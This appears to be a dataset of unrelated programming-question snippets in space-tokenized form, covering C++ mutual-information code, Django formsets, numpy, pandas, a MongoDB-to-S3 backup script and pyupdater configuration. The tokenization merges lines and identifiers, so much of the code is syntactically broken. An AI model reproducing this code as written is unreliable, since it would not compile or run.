stoi ( argv [ argc-1 ] , nullptr , 10 ) ; //bytes being transfered at a time long offset = totalbytes / sizeof ( double ) / 2 ; data = new double [ totalbytes/sizeof ( double ) ] ; int columnindex = 0 ; //read in data from pipe while ( count < totalbytes ) { fread ( & ( data [ columnindex ] ) , 1 , bytechunk , stdin ) ; columnindex += bytechunk / sizeof ( double ) ; count += bytechunk ; } //calculate the data transform MutualInformation MI = MutualInformation ( ) ; MI.Initialize ( data , height , width , offset ) ; MI.calcMI ( ) ; count = 0 ; //* //write out data to pipe columnindex = 0 ; while ( count < totalbytes/2 ) { fwrite ( & ( MI.getOutput ( ) [ columnindex ] ) , 1 , bytechunk , stdout ) ; fflush ( stdout ) ; count += bytechunk ; columnindex += bytechunk/sizeof ( double ) ; } //*/ delete [ ] data ; return 0 ; } double MutualInformation : :calcMI ( ) { double rvalue = 0.0 ; std : :map < int , map < int , double > > lHistXY = map < int , map < int , double > > ( ) ; std : :map < int , double > lHistX = map < int , double > ( ) ; std : :map < int , double > lHistY = map < int , double > ( ) ; typedef std : :map < int , std : :map < int , double > > : :iterator HistXY_iter ; typedef std : :map < int , double > : :iterator HistY_iter ; //calculate Entropys and MI double MI = 0.0 ; double Hx = 0.0 ; double Hy = 0.0 ; double Px = 0.0 ; double Py = 0.0 ; double Pxy = 0.0 ; //scan through the image int ip = 0 ; int jp = 0 ; int chipsize = 3 ; //setup zero array double * zeros = new double [ this- > mHeight ] ; for ( int j = 0 ; j < this- > mHeight ; j++ ) { zeros [ j ] = 0.0 ; } //zero out Output array for ( int i = 0 ; i < this- > mWidth ; i++ ) { memcpy ( & ( this- > mOutput [ i*this- > mHeight ] ) , zeros , this- > mHeight*8 ) ; } double index = 0.0 ; for ( int ioutter = chipsize ; ioutter < ( this- > mWidth - chipsize ) ; ioutter++ ) { //write out processing status //index = ( double ) ioutter ; //fwrite ( & index , 8 , 1 , stdout ) ; //fflush ( stdout ) ; //* for ( int j = chipsize ; j < ( this- > mHeight - chipsize ) ; j++ ) { //clear the histograms lHistX.clear ( ) ; lHistY.clear ( ) ; lHistXY.clear ( ) ; //chip out a section of the image for ( int k = -chipsize ; k < = chipsize ; k++ ) { for ( int l = -chipsize ; l < = chipsize ; l++ ) { ip = ioutter + k ; jp = j + l ; //update X histogram if ( lHistX.count ( int ( this- > mData [ ip*this- > mHeight + jp ] ) ) ) { lHistX [ int ( this- > mData [ ip*this- > mHeight + jp ] ) ] += 1.0 ; } else { lHistX [ int ( this- > mData [ ip*this- > mHeight + jp ] ) ] = 1.0 ; } //update Y histogram if ( lHistY.count ( int ( this- > mData [ ip*this- > mHeight + jp+this- > mOffset ] ) ) ) { lHistY [ int ( this- > mData [ ip*this- > mHeight + jp+this- > mOffset ] ) ] += 1.0 ; } else { lHistY [ int ( this- > mData [ ip*this- > mHeight + jp+this- > mOffset ] ) ] = 1.0 ; } //update X and Y Histogram if ( lHistXY.count ( int ( this- > mData [ ip*this- > mHeight + jp ] ) ) ) { //X Key exists check if Y key exists if ( lHistXY [ int ( this- > mData [ ip*this- > mHeight + jp ] ) ] .count ( int ( this- > mData [ ip*this- > mHeight + jp + this- > mOffset ] ) ) ) { //X & Y keys exist lHistXY [ int ( this- > mData [ ip*this- > mHeight + jp ] ) ] [ int ( this- > mData [ ip*this- > mHeight + jp + this- > mOffset ] ) ] += 1 ; } else { //X exist but Y does n't lHistXY [ int ( this- > mData [ ip*this- > mHeight + jp ] ) ] [ int ( this- > mData [ ip*this- > mHeight + jp + this- > mOffset ] ) ] = 1 ; } } else { //X Key Did n't exist lHistXY [ int ( this- > mData [ ip*this- > mHeight + jp ] ) ] [ int ( this- > mData [ ip*this- > mHeight + jp + this- > mOffset ] ) ] = 1 ; } ; } } //calculate PMI , Hx , Hy // iterator- > first = key // iterator- > second = value MI = 0.0 ; Hx = 0.0 ; Hy = 0.0 ; for ( HistXY_iter Hist2D_iter = lHistXY.begin ( ) ; Hist2D_iter ! = lHistXY.end ( ) ; Hist2D_iter++ ) { Px = lHistX [ Hist2D_iter- > first ] / ( ( double ) this- > mOffset ) ; Hx -= Px*log ( Px ) ; for ( HistY_iter HistY_iter = Hist2D_iter- > second.begin ( ) ; HistY_iter ! = Hist2D_iter- > second.end ( ) ; HistY_iter++ ) { Py = lHistY [ HistY_iter- > first ] / ( ( double ) this- > mOffset ) ; Hy -= Py*log ( Py ) ; Pxy = HistY_iter- > second / ( ( double ) this- > mOffset ) ; MI += Pxy*log ( Pxy / Py / Px ) ; } } //normalize PMI to max ( Hx , Hy ) so that the PMI value runs from 0 to 1 if ( Hx > = Hy & & Hx > 0.0 ) { MI /= Hx ; } else if ( Hy > Hx & & Hy > 0.0 ) { MI /= Hy ; } else { MI = 0.0 ; } //write PMI to data output array if ( MI < 1.1 ) { this- > mOutput [ ioutter*this- > mHeight + j ] = MI ; } else { this- > mOutput [ ioutter*this- > mHeight + j ] = 0.0 ; } } } return rvalue ; } # include < stdio.h > # include < stdlib.h > # include < string > # include < iostream > # include `` ./MutualInformation.h '' double * data ; using namespace std ; voidxxwrite ( unsigned char *buf , size_t wlen , FILE *fo ) { size_t xlen ; for ( ; wlen > 0 ; wlen -= xlen , buf += xlen ) { xlen = wlen ; if ( xlen > 1024 ) xlen = 1024 ; xlen = fwrite ( buf , 1 , xlen , fo ) ; fflush ( fo ) ; } } int main ( int argc , char **argv ) { int count = 0 ; long totalbytes = stoi ( argv [ argc-4 ] , nullptr,10 ) ; //bytes being transfered long bytechunk = stoi ( argv [ argc - 3 ] , nullptr , 10 ) ; //bytes being transfered at a time long height = stoi ( argv [ argc-2 ] , nullptr , 10 ) ; //bytes being transfered at a time long width = stoi ( argv [ argc-1 ] , nullptr , 10 ) ; //bytes being transfered at a time long offset = totalbytes / sizeof ( double ) / 2 ; data = new double [ totalbytes/sizeof ( double ) ] ; int columnindex = 0 ; //read in data from pipe while ( count < totalbytes ) { fread ( & ( data [ columnindex ] ) , 1 , bytechunk , stdin ) ; columnindex += bytechunk / sizeof ( double ) ; count += bytechunk ; } //calculate the data transform MutualInformation MI = MutualInformation ( ) ; MI.Initialize ( data , height , width , offset ) ; MI.calcMI ( ) ; count = 0 ; columnindex = 0 ; while ( count < totalbytes/2 ) { xxwrite ( ( unsigned char* ) & ( MI.getOutput ( ) [ columnindex ] ) , bytechunk , stdout ) ; count += bytechunk ; columnindex += bytechunk/sizeof ( double ) ; } delete [ ] data ; return 0 ; } # include < map > using namespace std ; class MutualInformation { private : double * mData ; double * mOutput ; long mHeight ; long mWidth ; long mOffset ; public : MutualInformation ( ) ; ~MutualInformation ( ) ; bool Initialize ( double * data , long Height , long Width , long Offset ) ; const double * getOutput ( ) ; double calcMI ( ) ; } ; # include `` MutualInformation.h '' MutualInformation : :MutualInformation ( ) { this- > mData = nullptr ; this- > mOutput = nullptr ; this- > mHeight = 0 ; this- > mWidth = 0 ; } MutualInformation : :~MutualInformation ( ) { delete [ ] this- > mOutput ; } bool MutualInformation : :Initialize ( double * data , long Height , long Width , long Offset ) { bool rvalue = false ; this- > mData = data ; this- > mHeight = Height ; this- > mWidth = Width ; this- > mOffset = Offset ; //allocate output data this- > mOutput = new double [ this- > mHeight*this- > mWidth ] ; return rvalue ; } const double * MutualInformation : :getOutput ( ) { return this- > mOutput ; } double MutualInformation : :calcMI ( ) { double rvalue = 0.0 ; std : :map < int , map < int , double > > lHistXY = map < int , map < int , double > > ( ) ; std : :map < int , double > lHistX = map < int , double > ( ) ; std : :map < int , double > lHistY = map < int , double > ( ) ; typedef std : :map < int , std : :map < int , double > > : :iterator HistXY_iter ; typedef std : :map < int , double > : :iterator HistY_iter ; //calculate Entropys and MI double MI = 0.0 ; double Hx = 0.0 ; double Hy = 0.0 ; double Px = 0.0 ; double Py = 0.0 ; double Pxy = 0.0 ; //scan through the image int ip = 0 ; int jp = 0 ; int chipsize = 3 ; //setup zero array double * zeros = new double [ this- > mHeight ] ; for ( int j = 0 ; j < this- > mHeight ; j++ ) { zeros [ j ] = 0.0 ; } //zero out Output array for ( int i = 0 ; i < this- > mWidth ; i++ ) { memcpy ( & ( this- > mOutput [ i*this- > mHeight ] ) , zeros , this- > mHeight*8 ) ; } double index = 0.0 ; for ( int ioutter = chipsize ; ioutter < ( this- > mWidth - chipsize ) ; ioutter++ ) { for ( int j = chipsize ; j < ( this- > mHeight - chipsize ) ; j++ ) { //clear the histograms lHistX.clear ( ) ; lHistY.clear ( ) ; lHistXY.clear ( ) ; //chip out a section of the image for ( int k = -chipsize ; k < = chipsize ; k++ ) { for ( int l = -chipsize ; l < = chipsize ; l++ ) { ip = ioutter + k ; jp = j + l ; //update X histogram if ( lHistX.count ( int ( this- > mData [ ip*this- > mHeight + jp ] ) ) ) { lHistX [ int ( this- > mData [ ip*this- > mHeight + jp ] ) ] += 1.0 ; } else { lHistX [ int ( this- > mData [ ip*this- > mHeight + jp ] ) ] = 1.0 ; } //update Y histogram if ( lHistY.count ( int ( this- > mData [ ip*this- > mHeight + jp+this- > mOffset ] ) ) ) { lHistY [ int ( this- > mData [ ip*this- > mHeight + jp+this- > mOffset ] ) ] += 1.0 ; } else { lHistY [ int ( this- > mData [ ip*this- > mHeight + jp+this- > mOffset ] ) ] = 1.0 ; } //update X and Y Histogram if ( lHistXY.count ( int ( this- > mData [ ip*this- > mHeight + jp ] ) ) ) { //X Key exists check if Y key exists if ( lHistXY [ int ( this- > mData [ ip*this- > mHeight + jp ] ) ] .count ( int ( this- > mData [ ip*this- > mHeight + jp + this- > mOffset ] ) ) ) { //X & Y keys exist lHistXY [ int ( this- > mData [ ip*this- > mHeight + jp ] ) ] [ int ( this- > mData [ ip*this- > mHeight + jp + this- > mOffset ] ) ] += 1 ; } else { //X exist but Y does n't lHistXY [ int ( this- > mData [ ip*this- > mHeight + jp ] ) ] [ int ( this- > mData [ ip*this- > mHeight + jp + this- > mOffset ] ) ] = 1 ; } } else { //X Key Did n't exist lHistXY [ int ( this- > mData [ ip*this- > mHeight + jp ] ) ] [ int ( this- > mData [ ip*this- > mHeight + jp + this- > mOffset ] ) ] = 1 ; } ; } } //calculate PMI , Hx , Hy // iterator- > first = key // iterator- > second = value MI = 0.0 ; Hx = 0.0 ; Hy = 0.0 ; for ( HistXY_iter Hist2D_iter = lHistXY.begin ( ) ; Hist2D_iter ! = lHistXY.end ( ) ; Hist2D_iter++ ) { Px = lHistX [ Hist2D_iter- > first ] / ( ( double ) this- > mOffset ) ; Hx -= Px*log ( Px ) ; for ( HistY_iter HistY_iter = Hist2D_iter- > second.begin ( ) ; HistY_iter ! = Hist2D_iter- > second.end ( ) ; HistY_iter++ ) { Py = lHistY [ HistY_iter- > first ] / ( ( double ) this- > mOffset ) ; Hy -= Py*log ( Py ) ; Pxy = HistY_iter- > second / ( ( double ) this- > mOffset ) ; MI += Pxy*log ( Pxy / Py / Px ) ; } } //normalize PMI to max ( Hx , Hy ) so that the PMI value runs from 0 to 1 if ( Hx > = Hy & & Hx > 0.0 ) { MI /= Hx ; } else if ( Hy > Hx & & Hy > 0.0 ) { MI /= Hy ; } else { MI = 0.0 ; } //write PMI to data output array if ( MI < 1.1 ) { this- > mOutput [ ioutter*this- > mHeight + j ] = MI ; } else { this- > mOutput [ ioutter*this- > mHeight + j ] = 0.0 ; //cout < < `` problem with output '' ; } } } //*/ return rvalue ; } # include < fcntl.h > # include < io.h > _setmode ( _fileno ( stdout ) , O_BINARY ) ; _setmode ( _fileno ( stdin ) , O_BINARY ) ; import os , msvcrtmsvcrt.setmode ( sys.stdout.fileno ( ) , os.O_BINARY ) msvcrt.setmode ( sys.stdin.fileno ( ) , os.O_BINARY )"
"class PeriodCreate ( RequestPassingFormViewMixin , WammuCreateView ) : model = Chain template_name = 'dashboard/period_form.html ' form_class = ChainForm def get_object ( self ) : chain = Chain.objects.get ( pk=self.kwargs [ 'chain_pk ' ] ) return chain def get_success_url ( self ) : return reverse ( 'dashboard_period_list ' , kwargs= { 'chain_pk ' : self.object.chain.id , } ) def get_context_data ( self , **kwargs ) : context = super ( PeriodCreate , self ) .get_context_data ( **kwargs ) return context def get_form_kwargs ( self , *args , **kwargs ) : kwargs = super ( PeriodCreate , self ) .get_form_kwargs ( *args , **kwargs ) chain = get_object_or_404 ( Chain , pk=self.kwargs [ 'chain_pk ' ] ) period = Period ( chain=chain ) kwargs [ 'instance ' ] = period return kwargs def get ( self , request , *args , **kwargs ) : self.object = None form_class = self.get_form_class ( ) form = self.get_form ( form_class ) PeriodInlineFormSet = inlineformset_factory ( Chain , Period , form=PeriodInlineForm , can_delete=True , extra=12 ) PeriodInlineFormSet.form = staticmethod ( curry ( PeriodInlineForm , request=request , chain=self.object ) ) period_formset = PeriodInlineFormSet ( ) return self.render_to_response ( self.get_context_data ( form=form , period_inline_formset=period_formset ) ) def post ( self , request , *args , **kwargs ) : self.object = Chain ( ) form = self.get_form ( self.form_class ) PeriodInlineFormSet = inlineformset_factory ( Chain , Period , form=PeriodInlineForm , can_delete=True , extra=5 ) PeriodInlineFormSet.form = staticmethod ( curry ( PeriodInlineForm ) ) if form.is_valid ( ) : self.object = form.save ( commit=False ) period_formset = PeriodInlineFormSet ( request.POST , instance=self.object ) if period_formset.is_valid ( ) : self.object.save ( ) period_formset.save ( ) return super ( PeriodCreate , self ) .form_valid ( form ) else : return self.render_to_response ( context=self.get_context_data ( form=form , period_inline_formset=period_formset ) ) else : period_formset = PeriodInlineFormSet ( request.POST , instance=self.object ) return self.render_to_response ( context=self.get_context_data ( form=form , period_inline_formset=period_formset ) ) class PeriodForm ( RequestPassingFormMixin , ModelForm ) : class Meta : model = Period fields = [ 'start_date ' , 'end_date ' , 'year ' , 'description ' ] class RequestPassingFormMixin ( object ) : def __init__ ( self , request , param , *args , **kwargs ) : self.request = request self.param = param super ( RequestPassingFormMixin , self ) .__init__ ( *args , **kwargs ) TypeError at ... .__init__ ( ) takes at least 3 arguments ( 2 given ) < tbody > { % csrf_token % } { { period_inline_formset.management_form } } { % for period_form in period_inline_formset % } { % for hidden in period_form.hidden_fields % } { { hidden } } { % endfor % } { { period_form.pk } } < tr > < td > { { period_form.start_date } } < /td > < td > { { period_form.end_date } } < /td > < td > { { period_form.year } } < /td > < td > { { period_form.description } } < /td > < td > { % if period_formset.can_delete % } { { period_form.DELETE } } { % endif % } < /td > < /tr > { % endfor % } < /tbody >"
if 1 < input ( `` Value : '' ) < 10 : print `` Is greater than 1 and less than 10 '' if 1 < input ( `` Val1 : '' ) < 10 < input ( `` Val2 : '' ) < 20 : print `` woo ! '' x = input ( `` Value : '' ) 1 < x and x < 10 : print `` Is between 1 and 10 ''
"def get_cloud_pipeline_options ( project ) : options = { 'runner ' : 'DataflowRunner ' , 'job_name ' : ( 'converter-ml6- { } '.format ( datetime.now ( ) .strftime ( ' % Y % m % d % H % M % S ' ) ) ) , 'staging_location ' : os.path.join ( BUCKET , 'staging ' ) , 'temp_location ' : os.path.join ( BUCKET , 'tmp ' ) , 'project ' : project , 'region ' : 'europe-west1 ' , 'zone ' : 'europe-west1-d ' , 'autoscaling_algorithm ' : 'THROUGHPUT_BASED ' , 'save_main_session ' : True , 'setup_file ' : './setup.py ' , 'worker_machine_type ' : 'custom-1-6656 ' , 'max_num_workers ' : 3 , } return beam.pipeline.PipelineOptions ( flags= [ ] , **options ) def main ( argv=None ) : args = parse_arguments ( sys.argv if argv is None else argv ) pipeline_options = get_cloud_pipeline_options ( args.project_id pipeline = beam.Pipeline ( options=pipeline_options )"
"n = 30000A = np.random.randint ( 0 , 1000 , n ) A == A [ np.newaxis ] .T"
unmapped = set ( foo ) - set ( bar.keys ( ) )
try : run_something ( ) except Exception as e : handle_error ( str ( e ) ) > > > import numpy as np > > > np.range ( 1e10 ) MemoryError Traceback ( most recent call last ) < ipython-input-4-20a59c2069b2 > in < module > ( ) -- -- > 1 np.arange ( 1e10 ) MemoryError : try : np.arange ( 1e10 ) except Exception as e : print ( str ( e ) ) print ( `` Catched ! '' )
"- User A- User B- User C - User A - Document A1 , only allow contacts to view - Document A2 , allow everyone to view - Document A3 , allow no one to view except myself - Document A4 , allow contacts , and contacts of contacts to view- User B - Documents B1 , B2 , B3 , B4 with similar privileges- User C - Documents C1 , C2 , C3 , C4 with similar privileges - Document B1 ( contacts can view ) - Document B2 ( everyone can view ) - Document B4 ( contacts of contacts ) - Document C2 ( everyone can view ) - Document C4 ( contacts of contacts )"
"12 34 5 67 8 9 1011 12 13 14 15 int [ ] r1 = { 1 } ; int [ ] r2 = { 2 , 3 } ; int [ ] r3 = { 4 , 5 , 6 } ; int [ ] r4 = { 7 , 8 , 9 , 10 } ; int [ ] r5 = { 11 , 12 , 13 , 14 , 15 } ;"
"from math import sin , pidef computePi ( x ) : # x : number of points desired p = x*sin ( pi/x ) print ( p ) computePi ( 10000 ) 3.141592601912665 from math import sqrtdef approxPi ( x ) : # x : number of times you want to recursively apply Archmidedes ' algorithm s = 1 # Unit circle a = None ; b = None ; for i in range ( x ) : a = sqrt ( 1 - ( s/2 ) **2 ) b = 1 - a print ( 'The approximate value of Pi using a { :5g } -sided polygon is { :1.8f } '.format ( 6*2** ( i ) , ( s*6*2** ( i ) ) /2 ) ) s = sqrt ( b**2 + ( s/2 ) **2 )"
"from ctypes import CDLL , c_void_pimport osimport sys # Codeclass silence ( object ) : def __init__ ( self , stdout=os.devnull ) : self.outfile = stdout def __enter__ ( self ) : # Flush sys.__stdout__.flush ( ) # Save self.saved_stream = sys.stdout self.fd = sys.stdout.fileno ( ) self.saved_fd = os.dup ( self.fd ) # Open the redirect self.new_stream = open ( self.outfile , 'wb ' , 0 ) self.new_fd = self.new_stream.fileno ( ) # Replace os.dup2 ( self.new_fd , self.fd ) def __exit__ ( self , *args ) : # Flush self.saved_stream.flush ( ) # Restore os.dup2 ( self.saved_fd , self.fd ) sys.stdout = self.saved_stream # Clean up self.new_stream.close ( ) os.close ( self.saved_fd ) # Test caselibc = CDLL ( 'libc.so.6 ' ) # Silence ! with silence ( ) : libc.printf ( b'Hello from C in silence\n ' ) $ python2.7 test.py $ python3.3 -u test.py $ python3.3 test.pyHello from C in silence"
"< div class='log ' > start < /div > < div class='ts ' > 2017-03-14 09:17:52.859 +0800 & nbsp ; < /div > < div class='log ' > bla bla bla < /div > < div class='ts ' > 2017-03-14 09:17:55.619 +0800 & nbsp ; < /div > < div class='log ' > aba aba aba < /div > ... ... 2017-03-14 09:17:52.859 +0800 , bla bla bla2017-03-14 09:17:55.619 +0800 , aba aba aba ... ... from bs4 import BeautifulSouppath = `` the_files/ '' def do_task_html ( ) : dir_path = os.listdir ( path ) for file in dir_path : if file.endswith ( `` .html '' ) : soup = BeautifulSoup ( open ( path+file ) ) item1 = [ element.text for element in soup.find_all ( `` div '' , `` ts '' ) ] string1 = `` .join ( item1 ) item2 = [ element.text for element in soup.find_all ( `` div '' , `` log '' ) ] string2 = `` .join ( item2 ) print string1 + `` , '' + string2 2017-03-14 09:17:52.859 +0800 2017-03-14 09:17:55.619 +0800 , start bla bla bla aba aba aba ... ..."
"# ! /bin/shMONGODB_SHELL='/usr/bin/mongo'DUMP_UTILITY='/usr/bin/mongodump'DB_NAME='amicus'date_now= ` date + % Y_ % m_ % d_ % H_ % M_ % S ` dir_name='db_backup_ ' $ { date_now } file_name='db_backup_ ' $ { date_now } '.bz2'log ( ) { echo $ 1 } do_cleanup ( ) { rm -rf db_backup_2010* log 'cleaning up ... . ' } do_backup ( ) { log 'snapshotting the db and creating archive ' & & \ $ { MONGODB_SHELL } admin fsync_lock.js & & \ $ { DUMP_UTILITY } -d $ { DB_NAME } -o $ { dir_name } & & tar -jcf $ file_name $ { dir_name } $ { MONGODB_SHELL } admin unlock.js & & \ log 'data backd up and created snapshot ' } save_in_s3 ( ) { log 'saving the backup archive in amazon S3 ' & & \ python aws_s3.py set $ { file_name } & & \ log 'data backup saved in amazon s3 ' } do_backup & & save_in_s3 & & do_cleanup ACCESS_KEY= '' SECRET= '' BUCKET_NAME='s3 : ///s3.amazonaws.com/database-backup ' # note that you need to create this bucket firstfrom boto.s3.connection import S3Connectionfrom boto.s3.key import Keydef save_file_in_s3 ( filename ) : conn = S3Connection ( ACCESS_KEY , SECRET ) bucket = conn.get_bucket ( BUCKET_NAME ) k = Key ( bucket ) k.key = filename k.set_contents_from_filename ( filename ) def get_file_from_s3 ( filename ) : conn = S3Connection ( ACCESS_KEY , SECRET ) bucket = conn.get_bucket ( BUCKET_NAME ) k = Key ( bucket ) k.key = filename k.get_contents_to_filename ( filename ) def list_backup_in_s3 ( ) : conn = S3Connection ( ACCESS_KEY , SECRET ) bucket = conn.get_bucket ( BUCKET_NAME ) for i , key in enumerate ( bucket.get_all_keys ( ) ) : print `` [ % s ] % s '' % ( i , key.name ) def delete_all_backups ( ) : # FIXME : validate filename exists conn = S3Connection ( ACCESS_KEY , SECRET ) bucket = conn.get_bucket ( BUCKET_NAME ) for i , key in enumerate ( bucket.get_all_keys ( ) ) : print `` deleting % s '' % ( key.name ) key.delete ( ) if __name__ == '__main__ ' : import sys if len ( sys.argv ) < 3 : print 'Usage : % s < get/set/list/delete > < backup_filename > ' % ( sys.argv [ 0 ] ) else : if sys.argv [ 1 ] == 'set ' : save_file_in_s3 ( sys.argv [ 2 ] ) elif sys.argv [ 1 ] == 'get ' : get_file_from_s3 ( sys.argv [ 2 ] ) elif sys.argv [ 1 ] == 'list ' : list_backup_in_s3 ( ) elif sys.argv [ 1 ] == 'delete ' : delete_all_backups ( ) else : print 'Usage : % s < get/set/list/delete > < backup_filename > ' % ( sys.argv [ 0 ] ) Traceback ( most recent call last ) : File `` aws_s3.py '' , line 42 , in < module > save_file_in_s3 ( sys.argv [ 2 ] ) File `` aws_s3.py '' , line 13 , in save_file_in_s3 k.set_contents_from_filename ( filename ) File `` /usr/local/lib/python2.7/dist-packages/boto/s3/key.py '' , line 1362 , in set_contents_from_filename encrypt_key=encrypt_key ) File `` /usr/local/lib/python2.7/dist-packages/boto/s3/key.py '' , line 1293 , in set_contents_from_file chunked_transfer=chunked_transfer , size=size ) File `` /usr/local/lib/python2.7/dist-packages/boto/s3/key.py '' , line 750 , in send_file chunked_transfer=chunked_transfer , size=size ) File `` /usr/local/lib/python2.7/dist-packages/boto/s3/key.py '' , line 951 , in _send_file_internal query_args=query_args File `` /usr/local/lib/python2.7/dist-packages/boto/s3/connection.py '' , line 664 , in make_request retry_handler=retry_handler File `` /usr/local/lib/python2.7/dist-packages/boto/connection.py '' , line 1071 , in make_request retry_handler=retry_handler ) File `` /usr/local/lib/python2.7/dist-packages/boto/connection.py '' , line 1030 , in _mexe raise exsocket.error : [ Errno 104 ] Connection reset by peer"
"import numpy as npmins = np.random.rand ( 2,2 ) maxs = np.random.rand ( 2,2 ) # Number of elements in the linspacex = 3m , n = mins.shaperesults = np.zeros ( ( m , n , x ) ) for i in range ( m ) : for j in range ( n ) : min = mins [ i ] [ j ] max = maxs [ i ] [ j ] results [ i ] [ j ] = np.linspace ( min , max , num=x )"
"$ echo -e 'from foo import bar\nfor i in range ( 10 ) : \n bar ( i+1 ) .thing = `` something '' \n\n ' | python $ python -c `` from sys import argv ; print argv '' [ '-c ' ] $ python -c `` for v in [ 1,2,3,4 ] : print v '' 1234 $ python -c `` from sys import argv ; for v in argv : print v '' File `` < string > '' , line 1 from sys import argv ; for v in argv : print v ^SyntaxError : invalid syntax $ python -c `` x = 5 ; for i in [ 1,2,3 ] : print i '' File `` < string > '' , line 1 x = 5 ; for i in [ 1,2,3 ] : print i ^SyntaxError : invalid syntax"
"[ scrapyd ] max_proc_per_cpu = 75debug = on 2015-06-05 13:38:10-0500 [ - ] Log opened.2015-06-05 13:38:10-0500 [ - ] twistd 15.0.0 ( /Library/Frameworks/Python.framework/Versions/2.7/Resources/Python.app/Contents/MacOS/Python 2.7.9 ) starting up.2015-06-05 13:38:10-0500 [ - ] reactor class : twisted.internet.selectreactor.SelectReactor.2015-06-05 13:38:10-0500 [ - ] Site starting on 68002015-06-05 13:38:10-0500 [ - ] Starting factory < twisted.web.server.Site instance at 0x104b91f38 > 2015-06-05 13:38:10-0500 [ Launcher ] Scrapyd 1.0.1 started : max_proc=300 , runner='scrapyd.runner ' python -c 'import multiprocessing ; print ( multiprocessing.cpu_count ( ) ) ' 4"
"import numpyfrom pandas import DataFramea = DataFrame ( { `` nums '' : [ 2233 , -23160 , -43608 ] } ) a.nums = numpy.int64 ( a.nums ) print ( a.nums ** 2 ) print ( ( a.nums ** 2 ) .sum ( ) ) 0 49862891 5363856002 1901657664Name : nums , dtype : int642443029553 0 49862891 5363856002 1901657664Name : nums , dtype : int64-1851937743"
"> > > c = `` play song I\ Want\ To\ Break\ Free '' > > > print c.split ( `` `` ) [ 'play ' , 'song ' , ' I\\ ' , 'Want\\ ' , 'To\\ ' , 'Break\\ ' , 'Free ' ] > > > c = `` play song I\ Want\ To\ Break\ Free '' > > > print c.split ( `` `` ) [ 'play ' , 'song ' , ' I ' , 'Want ' , 'To ' , 'Break ' , 'Free ' ]"
"class ClientConfig ( object ) : PUBLIC_KEY = 'None ' APP_NAME = 'dad123 ' COMPANY_NAME = 'dad123 ' UPDATE_URLS = [ 'ssh : //git @ bitbucket.org/Tysondogerz/ssh/download ' ] MAX_DOWNLOAD_RETRIES = 3 # ! /usr/bin/env python3from __future__ import print_functionimport timeimport argparseimport osimport signalimport sysimport loggingfrom selenium import webdriverlogging.basicConfig ( level=logging.DEBUG ) from client_config import ClientConfigfrom pyupdater.client import Client , AppUpdate , LibUpdateSsh_key = DWDJKWNADKJWANDJKWANDWJKDNAWJKDNWAKDNWAJDKWANDJKWANDWAJKDNWAKJDWNADKJWANDWAJKDNAWJKDNWAJKDNWAJKDWNADJKWANDJKWANDKJWADNWAJKDNWAJKNWQWQDWQNDJKQWNDJKWQNDWQJKDNWQJKDNWKJDNWKJANDWJKNDWJKNDWDUWDNWDHDUIWHDIUWHDUIWHDUIWHDIUWHDUIWHDWUDHWUIHDWUDHUhottyouremail @ example.com client = Client ( ClientConfig ( ) , ssh= { 'ssh_key ' } ) from pyupdater.client import Clientfrom client_config import ClientConfigdef print_status_info ( info ) : total = info.get ( u'total ' ) downloaded = info.get ( u'downloaded ' ) status = info.get ( u'status ' ) print downloaded , total , statusclient = Client ( ClientConfig ( ) ) client.refresh ( ) client.add_progress_hook ( print_status_info ) client = Client ( ClientConfig ( ) , refresh=True , progress_hooks= [ print_status_info ] ) lib_update = client.update_check ( ASSET_NAME , ASSET_VERSION ) lib_update = client.update_check ( ASSET_NAME , ASSET_VERSION , channel='beta ' ) if lib_update is not None : lib_update.download ( ) driver = webdriver.Firefox ( ) driver.get ( 'http : //stackoverflow.com ' ) if __name__ == `` __main__ '' : main ( )"
"> > > foo = object ( ) > > > foo.isValid = lambda : FalseTraceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > AttributeError : 'object ' object has no attribute 'isValid ' > > > tmptype = type ( 'tmptype ' , ( ) , { 'isValid ' : lambda self : False } ) > > > x = tmptype ( ) > > > x.isValid ( ) False"
"import argparseparser = argparse.ArgumentParser ( ) parser.add_argument ( '-v ' , ' -- version ' , action='version ' , version= ' % ( prog ) s 1.0\nCopyright ( c ) 2016 Lone Learner ' ) parser.parse_args ( ) $ python foo.py -- versionfoo.py 1.0 Copyright ( c ) 2016 Lone Learner"
"import logginglogging.basicConfig ( format='long detailed format ' , level=logging.DEBUG ) from raven import Clientfrom raven.conf import setup_loggingfrom raven.handlers.logging import SentryHandlerraven = Client ( environ.get ( 'SENTRYURL ' , `` ) , site='SITE ' ) setup_logging ( SentryHandler ( raven , level=logging.ERROR ) ) DEBUG : Configuring Raven for host : < DSN url >"
"{ 1 : [ 11.1 , 13 , 15.0 ] , 2 : [ 6.9 , 8.5 , 10.17 ] , 3 : [ 3.86 , 4.83 , 6.07 ] , 4 : [ 3.86 , 4.83 , 6.07 ] , 5 : [ 2.31 , 2.58 , 3.02 ] } [ 0.0248 , 0.0296 , 0.0357 ] [ round ( i*j,4 ) for i , j in zip ( S [ 1 ] , D1_inv ) ] Out [ 282 ] : [ 0.2753 , 0.3848 , 0.5355 ] [ round ( i*j,4 ) for i , j in zip ( S [ 2 ] , D1_inv ) ] Out [ 283 ] : [ 0.1711 , 0.2516 , 0.3631 ]"
"class again ( object ) : def __enter__ ( self ) : pass def __exit__ ( self , exc_type , exc_val , exc_tb ) : if exc_type is not None : ? ? ? ? # Invoke the code object again return True # eat exception x = 0with again ( ) : print x x += 1 if x == 1 : raise Exception ( ' I hate 1 ' ) 01"
"import pandas as pdimport numpy as npimport sqlite3df_students = pd.DataFrame ( { 'id ' : list ( range ( 0,4 ) ) + list ( range ( 0,4 ) ) , 'time ' : [ 0 ] *4 + [ 1 ] *4 , 'school ' : [ ' A ' ] *2 + [ ' B ' ] *2 + [ ' A ' ] *2 + [ ' B ' ] *2 , 'satisfaction ' : np.random.rand ( 8 ) } ) df_students.set_index ( [ 'id ' , 'time ' ] , inplace=True ) satisfaction schoolid time 0 0 0.863023 A1 0 0.929337 A2 0 0.705265 B3 0 0.160457 B0 1 0.208302 A1 1 0.029397 A2 1 0.266651 B3 1 0.646079 Bdf_schools = pd.DataFrame ( { 'school ' : [ ' A ' ] *2 + [ ' B ' ] *2 , 'time ' : [ 0 ] *2 + [ 1 ] *2 , 'mean_scores ' : np.random.rand ( 4 ) } ) df_schools.set_index ( [ 'school ' , 'time ' ] , inplace=True ) df_schools mean_scoresschool time A 0 0.358154A 0 0.142589B 1 0.260951B 1 0.683727 # # Send to SQLite3conn = sqlite3.connect ( 'schools_students.sqlite ' ) df_students.to_sql ( 'students ' , conn ) df_schools.to_sql ( 'schools ' , conn ) def example_f ( satisfaction , mean_scores ) `` '' '' Silly function that divides mean satisfaction per school 